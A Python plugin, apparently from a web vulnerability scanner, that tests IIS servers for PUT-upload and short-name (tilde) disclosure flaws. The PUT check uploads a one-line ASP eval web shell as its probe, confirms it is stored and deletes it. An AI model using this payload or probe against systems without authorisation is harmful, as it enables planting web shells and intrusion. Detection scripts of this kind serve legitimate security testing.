#coding=utf-8
import requests
import sys
import http.client
import urllib.parse
import threading
import queue
import time
def IIS_PUT(arg,config):
    try:
        url = arg.url
        data = '<%eval request("1111111111")%>'
        res = requests.put(url=url, data=data, timeout=5)
        html_text = requests.get(url).text
        if '<%eval request("1111111111")%>' in html_text:
            print(('[+] {} 存在IIS PUT上传'.format(url)))
            requests.delete(url)
            print(('[+] {} 成功删除测试文件'.format(url)))
        else:
            print(('[-] {} 不存在IIS PUT上传'.format(url)))
    except Exception as e:
        print(e)

def IIS_shortname_Scanner(url):
    try:
        for _method in ['GET', 'OPTIONS']:
            if _method == 'GET':
                status_1 = requests.get(url+ '/*~1*/a.aspx')  # an existed file/folder
                status_2 = requests.get(url + '/l1j1e*~1*/a.aspx')  # not existed file/folder
            else:
                status_1 = requests.options(url + '/*~1*/a.aspx')  # an existed file/folder
                status_2 = requests.options(url + '/l1j1e*~1*/a.aspx')  # not existed file/folder
            if status_1.status_code == 404 and status_2.status_code != 404:
                print("Server 存在 IIS shortname vulnerable")
            else:
                print("Server 不存在 IIS shortname vulnerable")
        return False
    except Exception as e:
        raise Exception('[is_vul.Exception] %s' % str(e))
def IIS_special_plugin_(arg,config):
    IIS_PUT(arg,config)
    IIS_shortname_Scanner(arg.url)